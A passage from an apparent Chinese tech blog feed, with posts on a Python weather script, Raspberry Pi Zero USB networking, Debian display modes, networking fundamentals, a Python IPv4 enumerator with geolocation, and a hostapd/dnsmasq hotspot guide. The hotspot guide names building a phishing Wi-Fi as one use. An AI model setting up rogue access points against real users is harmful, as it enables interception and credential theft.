punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'fl'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'cond_txt'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'wind_dir'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'wind_sc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'wind_spd'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'hum'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'pres'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'vis'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>               page<span class="token punctuation">[</span><span class="token string">'HeWeather6'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'now'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'cloud'</span><span class="token punctuation">]</span>               <span class="token punctuation">)</span>              <span class="token punctuation">)</span>    <span class="token keyword">elif</span> weather_type <span class="token operator">==</span> <span class="token string">'forecast'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">""" wadaxi        """</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    get_weather<span class="token punctuation">(</span>weather_type<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'北京'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://img.ex1t.xyz/20201230165843.png"><br>主函数中get_weather()的参数可以根据你的需求替换，学会了实况天气查询，想要查询未来天气、生活指数的话相信也难不倒你，你也可以将此代码补充更加完整。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在 Mac OS 下一根线玩转树莓派 zero w</title>
      <link href="2020/01/14/%E5%9C%A8-mac-os-%E4%B8%8B%E4%B8%80%E6%A0%B9%E7%BA%BF%E7%8E%A9%E8%BD%AC%E6%A0%91%E8%8E%93%E6%B4%BE-zero-w/"/>
      <url>2020/01/14/%E5%9C%A8-mac-os-%E4%B8%8B%E4%B8%80%E6%A0%B9%E7%BA%BF%E7%8E%A9%E8%BD%AC%E6%A0%91%E8%8E%93%E6%B4%BE-zero-w/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230165431.png"></p><ol><li><p>在树莓派官网下载下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，使用 etcher 刻录到 sd 中<br><img src="http://img.ex1t.xyz/20201230165358.png"><br><img src="http://img.ex1t.xyz/20201230165332.png"></p></li><li><p>刷好系统后编辑config.txt文件，在最后一行下，另起一行添加：<br><code>dtoverlay=dwc2</code></p></li><li><p>打开cmdline.txt文件。找到单词rootwait，在其之后添加：<br><code>modules-load=dwc2,g_ether</code></p></li><li><p>添加一个文件名为ssh到根目录下，内容为空</p></li><li><p>把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。<br><img src="http://img.ex1t.xyz/20201230165244.jpg"></p></li><li><p>Ping 一下raspberrypi.local看是否能通 </p></li><li><p>之后查看 Mac 的共享名称<br> <img src="http://img.ex1t.xyz/20201230165220.jpg"></p></li><li><p>ssh连接raspberrypi.local，默认密码为raspberry <code>ssh pi@raspberrypi.local</code></p></li><li><p>通过 mac 自带的网络共享按照如下方式配置即可让树莓派上网<br><img src="http://img.ex1t.xyz/20201230165205.png"></p></li><li><p>现在试试是不是可以上网了</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debian linux的图形界面和文本界面的切换</title>
      <link href="2020/01/14/debian-linux%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%92%8C%E6%96%87%E6%9C%AC%E7%95%8C%E9%9D%A2%E7%9A%84%E5%88%87%E6%8D%A2/"/>
      <url>2020/01/14/debian-linux%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%92%8C%E6%96%87%E6%9C%AC%E7%95%8C%E9%9D%A2%E7%9A%84%E5%88%87%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="Debian-linux的图形界面和文本界面的切换"><a href="#Debian-linux的图形界面和文本界面的切换" class="headerlink" title="Debian linux的图形界面和文本界面的切换"></a>Debian linux的图形界面和文本界面的切换</h1><p><img src="http://img.ex1t.xyz/20201230164936.png"></p><p>文件修改开机是否图形配置：</p><ol><li><p>配置图行界面的文件是 vi /etc/default/grub<br>找到：<code>GRUB_CMDLINE_LINUX_DEFAULT="quiet"</code>。<br>复制本行然后把quiet替换成text。<br>把本行注释掉（以免以后想改回来时不知道怎么改回来）。<br>保存后 执行sudo update-grub命令后 重启即可</p></li><li><p>如果想kali每次启动是文本模式可以修改如下文件：<br><code>vi /etc/X11/default-display-manager</code><br>把里面内容/usr/sbin/gdm3改为false之后重启会以文本模式登录，想改回图形就把false还原回/usr/sbin/gdm3</p></li><li><p>快捷键切换（推荐）：ctrl+alt+F1文本模式ctrl+alt+F7图形界面</p></li></ol><h1 id="Kali-图形界面和字符界面切换"><a href="#Kali-图形界面和字符界面切换" class="headerlink" title="Kali 图形界面和字符界面切换"></a>Kali 图形界面和字符界面切换</h1><blockquote><p>Systemd是一种新的linux系统服务管理器。它替换了init系统，能够管理系统的启动过程和一些系统服务，一旦启动起来，就将监管整个系统。</p></blockquote><ul><li><p>切换至字符界面：<br><code>sudo systemctl set-default multi-user.target</code></p></li><li><p>切换至图形界面：<br><code>sudo systemctlset-default graphical.target</code></p></li><li><p>打开图形界面：<br><code>sudo init 5</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复习-网络基础部分</title>
      <link href="2020/01/10/%E5%A4%8D%E4%B9%A0-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86/"/>
      <url>2020/01/10/%E5%A4%8D%E4%B9%A0-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230173056.jpg"></p><h2 id="1、什么是网络"><a href="#1、什么是网络" class="headerlink" title="1、什么是网络"></a>1、什么是网络</h2><pre><code> 两个终端，用一条能承载数据传输的物理介质（传输介质）连接起来，就组成了一个最简单的网络。</code></pre><h2 id="2、OSI七层参考模型"><a href="#2、OSI七层参考模型" class="headerlink" title="2、OSI七层参考模型"></a>2、OSI七层参考模型</h2><pre><code>网线-物理层: 在设备之间传输比特流，规定了电平、速度和电缆针脚。交换机-数据链路层：将比特组合成字节，再将字节组合成帧，使用链路层地址（以太网使用MAC地址）来访问介质，并进行差错检测。路由器-网络层：提供逻辑地址，供路由器确定路径。 传输层：提供面向连接或非面向连接的数据传递以及进行重传前的差错检测。会话层：负责建立、管理和终止表示层实体之间的通信会话。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。表示层：提供各种用于应用层数据的编码和转换功能，确保一个系统的应用层发送的数据能被另一个系统的应用层识别。应用软件- 应用层：OSI参考模型中最靠近用户的一层，为应用程序提供网络服务。</code></pre><h2 id="3、TCP-IP模型"><a href="#3、TCP-IP模型" class="headerlink" title="3、TCP/IP模型"></a>3、TCP/IP模型</h2><pre><code>应用层通过各种协议向终端用户提供业务应用---数据   提供应该程序网络接口传输层保证源端到目的端之间的可靠传输-----端口号+数据   建立端到端连接网络层解决网络之间的逻辑转发问题-------ip地址+端口号+数据  寻址和路由选择ip网络接口层---------------------------物理地址+ip地址+端口号+数据 物理介质访问 二进制数据流传输</code></pre><h2 id="4、三次握手-建立TCP连接的过程"><a href="#4、三次握手-建立TCP连接的过程" class="headerlink" title="4、三次握手-建立TCP连接的过程"></a>4、三次握手-建立TCP连接的过程</h2><pre><code>三次握手指建立一个TCP连接时，需要客户端和服务器总共发送三个包。进行三次握手的主要作用是为了确定双方的接受能力和发送能力是否正常、指定自己的初始化序列为后面的可靠性传输做准备。实质上就是连接服务器指定端口，建立TCP连接，并同步连接双方的序列号和确认号，交换TCP窗口大小信号。</code></pre><p>刚开始客户端处于 Closed 的状态，服务端处于 Listen 状态。<br> 进行三次握手</p><pre><code>第一次握手：客户端向服务器发送SYN报文，并指明客户端的初始化序列号 ISN©。此时客户端处于 SYN_SEND 状态。           首部的同步位SYN=1，初始序号seq=x，SYN=1的报文段不能携带数据，但要消耗掉一个序号。第二次握手：服务器收到客户端的 SYN 报文之后，会以自己的 SYN 报文作为应答，            并且也是指定了自己的初始化序列号 ISN(s)。同时会把客户端的 ISN + 1 作为ACK 的值，表示自己已经收到了客户端的 SYN，此时服务器处于 SYN_REVD 的状态。第三次握手：客户端收到 SYN 报文之后，会发送一个 ACK 报文，            当然，也是一样把服务器的 ISN + 1 作为 ACK 的值，表示已经收到了服务端的 SYN 报文，            此时客户端处于 ESTABLISHED 状态。服务器收到 ACK 报文之后，也处于 ESTABLISHED 状态，此时，双方已建立起了连接。            确认报文段ACK=1，确认号ack=y+1，序号seq=x+1（初始为seq=x，第二个报文段所以要+1），ACK报文段可以携带数据，不携带数据则不消耗序号。</code></pre><h2 id="5、四次挥手-断开TCP连接的过程"><a href="#5、四次挥手-断开TCP连接的过程" class="headerlink" title="5、四次挥手-断开TCP连接的过程"></a>5、四次挥手-断开TCP连接的过程</h2><pre><code>建立一个连接需要三次握手，而终止一个连接要经过四次挥手（也有将四次挥手叫做四次握手的）。这由TCP的半关闭（half-close）造成的。所谓的半关闭，其实就是TCP提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力。</code></pre><p>刚开始双方都处于 ESTABLISHED 状态，假如是客户端先发起关闭请求。<br>进行四次挥手</p><pre><code>第一次挥手：客户端发送一个 FIN 报文，报文中会指定一个序列号。此时客户端处于 FIN_WAIT1 状态。            即发出连接释放报文段（FIN=1，序号seq=u），并停止再发送数据，主动关闭TCP连接，进入FIN_WAIT1（终止等待1）状态，等待服务端的确认。第二次挥手：服务端收到 FIN 之后，会发送 ACK 报文，且把客户端的序列号值 +1 作为 ACK 报文的序列号值，表明已经收到客户端的报文了，此时服务端处于 CLOSE_WAIT 状态。            即服务端收到连接释放报文段后即发出确认报文段（ACK=1，确认号ack=u+1，序号seq=v），            服务端进入CLOSE_WAIT（关闭等待）状态，此时的TCP处于半关闭状态，客户端到服务端的连接释放。客户端收到服务端的确认后，进入FIN_WAIT2（终止等待2）状态，等待服务端发出的连接释放报文段。第三次挥手：如果服务端也想断开连接了，和客户端的第一次挥手一样，发给 FIN 报文，且指定一个序列号。此时服务端处于 LAST_ACK 的状态。            即服务端没有要向客户端发出的数据，服务端发出连接释放报文段（FIN=1，ACK=1，序号seq=w，确认号ack=u+1），            服务端进入LAST_ACK（最后确认）状态，等待客户端的确认。第四次挥手：客户端收到 FIN 之后，一样发送一个 ACK 报文作为应答，且把服务端的序列号值 +1 作为自己 ACK 报文的序列号值，此时客户端处于 TIME_WAIT 状态。需要过一阵子以确保服务端收到自己的 ACK 报文之后才会进入 CLOSED 状态，服务端收到 ACK 报文之后，就处于关闭连接了，处于 CLOSED 状态。            即客户端收到服务端的连接释放报文段后，对此发出确认报文段（ACK=1，seq=u+1，ack=w+1），客户端进入TIME_WAIT（时间等待）状态。此时TCP未释放掉，需要经过时间等待计时器设置的时间2MSL后，客户端才进入CLOSED状态。</code></pre><p>收到一个FIN只意味着在这一方向上没有数据流动。客户端执行主动关闭并进入TIME_WAIT是正常的，服务端通常执行被动关闭，不会进入TIME_WAIT状态。<br>参考链接：<a href="https://zhuanlan.zhihu.com/p/86426969">https://zhuanlan.zhihu.com/p/86426969</a></p><h2 id="6、IPv4"><a href="#6、IPv4" class="headerlink" title="6、IPv4"></a>6、IPv4</h2><pre><code>IP报文头部长度为20到60字节，IPv4地址为32比特的二进制数，通常用点分十进制表示。IP地址包括两部分，第一部分是网络号，表示IP地址所属的网段，第二部分是主机号，用来唯一标识本网段上的某台网络设备。IP地址的主机位为全0，表示一个网段，广播地址的主机位为全1。</code></pre><p>IPv4地址被划分为A、B、C、D、E五类</p><pre><code>A类地址第一字节的最高位固定为0（0.0.0.0~127.255.255.255）B类地址第一字节的高两位固定为10（128.0.0.0~191.255.255.255）C类地址第一字节的高三位固定为110（192.0.0.0~223.255.255.255）D类地址第一字节的高四位固定为1110（224.0.0.0~239.255.255.255）组播E类地址第一字节的高四位固定为1111(240.0.0.0~255.255.255.255)保留</code></pre><p>特殊地址</p><pre><code>私有地址范围10.0.0.0~10.255.255.255 172.16.0.0~172.31.255.255192.168.0.0~192.168.255.255特殊地址127.0.0.0 ~ 127.255.255.255（本机）0.0.0.0255.255.255.255</code></pre><p>子网掩码用于区分网络部分和主机部分。子网掩码中的1表示网络位，0表示主机位。<br>IP报文头中包含一个生存时间TTL（Time To Live）字段，报文每经过一台三层设备，TTL值减1,当报文中的TTL降为0时，报文会被丢弃。同时，丢弃报文的设备会根据报文头中的源IP地址向源端发送ICMP错误消息。</p><h2 id="7、常见协议"><a href="#7、常见协议" class="headerlink" title="7、常见协议"></a>7、常见协议</h2><p>（1）ICMP协议</p><pre><code>  ICMP（Internet控制报文协议）是TCP/IP协议簇的核心协议之一，  它用于在IP网络设备之间发送控制报文，传递差错、控制、查询等信息。</code></pre><p>典型应用：ping  Tracert<br>（2）ARP协议</p><pre><code>  一台网络设备要发送数据给另一台网络设备时，  必须要知道对方的IP地址和MAC地址。MAC地址通过ARP协议来获取。  ARP报文不能穿越路由器，不能被转发到其他广播域。  网络设备一般都有一个ARP缓存（ARP Cache），ARP缓存用来存放IP地址和MAC地址的关联信息。在发送数据前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的MAC地址，则直接采用该MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应信息，则通过发送ARP request报文来获得它。</code></pre><p>（3）HTTP协议</p><pre><code>HTTP(Hyper Text Transfer Protocol)的缩写.是用于从WWW服务器传输超文本到本地浏览器的传输协议.HTTP是一个应用层协议,由请求和响应构成,是一个标准的个客户端和服务器模型.它的主要特点如下:1. 支持客户端/服务器模型2. 简单快速</code></pre><p>（4）FTP协议</p><pre><code>FTP（File Transfer Protocol，文件传输协议） 是 TCP/IP 协议组中的协议之一。FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端。其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。</code></pre><p>（5）Telnet协议</p><pre><code>Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。</code></pre><p>（6）SMTP协议</p><pre><code>SMTP是一种提供可靠且有效的电子邮件传输的协议。SMTP是建立在FTP文件传输服务上的一种邮件服务，主要用于系统之间的邮件信息传递，并提供有关来信的通知。SMTP独立于特定的传输子系统，且只需要可靠有序的数据流信道支持，SMTP的重要特性之一是其能跨越网络传输邮件，即“SMTP邮件中继”。使用SMTP，可实现相同网络处理进程之间的邮件传输，也可通过中继器或网关实现某处理进程与其他网络之间的邮件传输。</code></pre><p>（7）UDP协议</p><pre><code>Internet 协议集支持一个无连接的传输协议，该协议称为用户数据报协议（UDP，User Datagram Protocol）。UDP 为应用程序提供了一种无需建立连接就可以发送封装的 IP 数据报的方法。Internet 的传输层有两个主要协议，互为补充。无连接的是 UDP</code></pre><p>（8）TCP协议</p><pre><code>传输控制协议（TCP，Transmission Control Protocol）是一种面向连接的、可靠的、基于字节流的传输层通信协议</code></pre><p>（9）IP协议</p><pre><code>主要负责将数据包发送给最终的目标计算机。ip协议是面向无连接的，ip地址是IP协议的基石。DNS负责将域名转换为IP地址，ARP负责根据IP找到MAC地址，RARP功能与ARP相反。DHCP可以自动获取IP地址socket是应用程序实现TCP/UDP的API</code></pre><p>待补充</p><h2 id="8、网络设备"><a href="#8、网络设备" class="headerlink" title="8、网络设备"></a>8、网络设备</h2><pre><code>网卡：计算机连接网络的设备网桥：数据链路层连接两个网络的设备，能够识别数据链路层中的数据帧并将其转换成一个全新的帧发送给另一个网段交换机：可以看做持有多个端口的网桥路由器：作用在网络层，对分组报文进行转发网关：用来转发来自不同网段之间的数据包。防火墙：在不同网络（如可信任的企业内部网和不可信的公共网）或网络安全域之间的一系列部件的组合。        它可以通过监测、限制、更改跨越防火墙的数据流。IPS：即入侵防御系统，有时又称IDP，即入侵检测（IDS）和防御系统，指具备IDS的检测能力，同时部署防御系统、    入侵检测和防御、病毒防御、Dos和DDos防护、url过滤、应用检测VPN：虚拟专用网络;功能是在公用网络上建立专用网络,进行加密通讯。日志审计：集中采集信息系统中的系统安全事件、用户访问记录、系统运行日志、系统运行状态等各类信息，        经过规范化、过滤、归并和告警分析等处理后，以统一格式的日志形式进行集中存储和管理，结合丰富的日志统计汇总及关联分析功能，实现对信息系统日志的全面审计。WAF：即Web应用防火墙或Web应用过防护系统。通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。    功能：XXS（可信任的网页夹带木马）防护、SQL注入、CSRF(w伪造一个可信的网站)防护，防盗链，及robot（爬虫）防护等。ADS：流量清洗设备，防止DDOS攻击。</code></pre><h2 id="9、HTTP状态码"><a href="#9、HTTP状态码" class="headerlink" title="9、HTTP状态码"></a>9、HTTP状态码</h2><pre><code>200("OK")：一切正常。实体主体中的文档（若存在的话）是某资源的表示。400("Bad Request")：客户端方面的问题。实体主题中的文档（若存在的话）是一个错误消息。希望客户端能够理解此错误消息，并改正问题。500("Internal Server Error")：服务期方面的问题。实体主体中的文档（如果存在的话）是一个错误消息。该错误消息通常无济于事，因为客户端无法修复服务器方面的问题。301("Moved Permanently")：当客户端触发的动作引起了资源URI的变化时发送此响应代码。另外，当客户端向一个资源的旧URI发送请求时，也发送此响应代码。404("Not Found") 和410("Gone")：当客户端所请求的URI不对应于任何资源时，发送此响应代码。404用于服务器端不知道客户端要请求哪个资源的情况；410用于服务器端知道客户端所请求的资源曾经存在，但现在已经不存在了的情况。409("Conflict")：当客户端试图执行一个”会导致一个或多个资源处于不一致状态“的操作时，发送此响应代码。</code></pre><p>参考链接：<a href="https://www.cnblogs.com/xflonga/p/9368993.html">https://www.cnblogs.com/xflonga/p/9368993.html</a></p><h2 id="10、待补充。。。"><a href="#10、待补充。。。" class="headerlink" title="10、待补充。。。"></a>10、待补充。。。</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 网络基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用python生成IP地址</title>
      <link href="2019/12/26/%E4%BD%BF%E7%94%A8python%E7%94%9F%E6%88%90ip%E5%9C%B0%E5%9D%80/"/>
      <url>2019/12/26/%E4%BD%BF%E7%94%A8python%E7%94%9F%E6%88%90ip%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="IP地址生成"><a href="#IP地址生成" class="headerlink" title="IP地址生成"></a>IP地址生成</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#_*_ coding:utf8 _*_</span><span class="token comment"># Created on 2017/11/25.</span>__author__ <span class="token operator">=</span> <span class="token string">'k3vi'</span><span class="token keyword">from</span> itertools <span class="token keyword">import</span> product<span class="token punctuation">,</span> islice<span class="token keyword">from</span> ip2locate <span class="token keyword">import</span> Ip2Locate<span class="token keyword">class</span> <span class="token class-name">Generate_ip_pool</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>fmt <span class="token operator">=</span> <span class="token string">"%s.%s.%s.%s"</span>        self<span class="token punctuation">.</span>start<span class="token operator">=</span><span class="token string">'1.0.0.0'</span>    <span class="token keyword">def</span> <span class="token function">ip_pool</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        p1<span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p3<span class="token punctuation">,</span>p4<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> self<span class="token punctuation">.</span>start<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ip <span class="token operator">=</span> islice<span class="token punctuation">(</span>product<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> p3<span class="token punctuation">,</span> p4<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>ip<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    iplocate <span class="token operator">=</span> Ip2Locate<span class="token punctuation">(</span><span class="token punctuation">)</span>    x <span class="token operator">=</span> Generate_ip_pool<span class="token punctuation">(</span><span class="token punctuation">)</span>    ipPool <span class="token operator">=</span> x<span class="token punctuation">.</span>ip_pool<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ip <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">next</span><span class="token punctuation">(</span>ipPool<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        iplocate<span class="token punctuation">.</span>ip <span class="token operator">=</span> ip        <span class="token keyword">print</span><span class="token punctuation">(</span>iplocate<span class="token punctuation">.</span>locate<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派3B创建 wifi 热点</title>
      <link href="2019/11/14/%E6%A0%91%E8%8E%93%E6%B4%BE3b%E5%88%9B%E5%BB%BA-wifi-%E7%83%AD%E7%82%B9/"/>
      <url>2019/11/14/%E6%A0%91%E8%8E%93%E6%B4%BE3b%E5%88%9B%E5%BB%BA-wifi-%E7%83%AD%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230165108.png"></p><hr><blockquote><p>为了方便的使用树莓派，有时我们需要通过wifi来操作树莓派，或者利用树莓派来建立钓鱼wifi，这个时候我们就可以使用hostapd来创建一个wifi热点。下面是具体的操作</p></blockquote><h5 id="安装-hostapd、dnsmasq："><a href="#安装-hostapd、dnsmasq：" class="headerlink" title="安装 hostapd、dnsmasq："></a>安装 hostapd、dnsmasq：</h5><p><code>sudo apt-get install hostapd dnsmasq</code></p><h5 id="然后在-etc-dnsmasq-conf末加入"><a href="#然后在-etc-dnsmasq-conf末加入" class="headerlink" title="然后在/etc/dnsmasq.conf末加入"></a>然后在/etc/dnsmasq.conf末加入</h5><p>（自己修改IP和网段，这个文件是已存在的，很详细的配置文件，但是所有行都加入了#号注释掉）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">interface</span><span class="token operator">=</span>wlan0dhcp-range<span class="token operator">=</span><span class="token number">10.0</span>.0.2,10.0.0.5,255.255.255.0,12h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="然后新建-etc-hostapd-hostapd-conf，加入"><a href="#然后新建-etc-hostapd-hostapd-conf，加入" class="headerlink" title="然后新建/etc/hostapd/hostapd.conf，加入"></a>然后新建/etc/hostapd/hostapd.conf，加入</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">interface</span><span class="token operator">=</span>wlan0<span class="token assign-left variable">hw_mode</span><span class="token operator">=</span>g<span class="token assign-left variable">channel</span><span class="token operator">=</span><span class="token number">10</span><span class="token assign-left variable">auth_algs</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">wpa</span><span class="token operator">=</span><span class="token number">2</span><span class="token assign-left variable">wpa_key_mgmt</span><span class="token operator">=</span>WPA-PSK<span class="token assign-left variable">wpa_pairwise</span><span class="token operator">=</span>CCMP<span class="token assign-left variable">rsn_pairwise</span><span class="token operator">=</span>CCMP<span class="token assign-left variable">wpa_passphrase</span><span class="token operator">=</span>wifi密码<span class="token assign-left variable">ssid</span><span class="token operator">=</span>wifi名字<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="接着修改-etc-sysctl-conf，开启网卡的转发功能，如果不修改此项，热点将无法上网"><a href="#接着修改-etc-sysctl-conf，开启网卡的转发功能，如果不修改此项，热点将无法上网" class="headerlink" title="接着修改/etc/sysctl.conf，开启网卡的转发功能，如果不修改此项，热点将无法上网"></a>接着修改/etc/sysctl.conf，开启网卡的转发功能，如果不修改此项，<em>热点将无法上网</em></h5><p>更改如下内容（如果有这一行，把#号去掉就行）</p><p><code>net.ipv4.ip_forward=1</code></p><h5 id="最后，将下面脚本加入到-etc-rc-local的exit-0前："><a href="#最后，将下面脚本加入到-etc-rc-local的exit-0前：" class="headerlink" title="最后，将下面脚本加入到/etc/rc.local的exit 0前："></a>最后，将下面脚本加入到/etc/rc.local的exit 0前：</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ifconfig</span> wlan0 down<span class="token function">ifconfig</span> wlan0 <span class="token number">10.0</span>.0.1 netmask <span class="token number">255.255</span>.255.0 upiwconfig wlan0 power off<span class="token function">service</span> dnsmasq restarthostapd -B /etc/hostapd/hostapd.conf <span class="token operator">&amp;</span> <span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token function">sudo</span> iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE<span class="token function">sudo</span> iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT<span class="token function">sudo</span> iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT<span aria-hidden="true" 